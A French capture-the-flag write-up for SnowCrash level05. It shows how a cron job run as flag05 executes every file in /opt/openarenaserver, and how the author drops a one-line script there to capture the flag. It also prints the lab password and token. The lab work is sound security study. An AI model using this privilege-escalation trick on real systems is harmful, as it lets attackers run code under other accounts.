# Level05

Une fois connecté avec le username:motdepasse level05:ne2searoevaevoem4ov4ar8ap (obtenu dans le flag précédent), nous arrivons sur le home de l'utilisateur level05.  
```sh
➜  ~ ssh level05@localhost -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.0.2.15
level05@localhost's password:
You have new mail.
```
Nous somme averti qu'un mail nous attends !
Allons voir ce mail  :
```sh
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
Ce mail nois informe qu'une tache cron est planifié, cette tache execute le script /usr/sbin/openarenaserver toutes les 2 minutes avec le compte flag05.  
Allons voir le script /usr/sbin/openarenaserver :  
```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
Ce script execute tous les fichiers présents dans /opt/openarenaserver/ avec bash et les supprime ensuite.  
Nous allons utiliser cette faille a notre avantage. Nous allons créer un script dans /opt/openarenaserver qui execute la commande getflag et en enregistrer le retour dans un fichier /tmp/flag.  
```
echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
```
Deux minutes plus tard, il nous reste plus qu'a regarder le fichier `/tmp/flag`
```sh
level05@SnowCrash:/$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

||<h3 align="center"> Documentation </h3>|
|:--------:|:---------:|
|cron|http://manpagesfr.free.fr/man/man5/crontab.5.html|
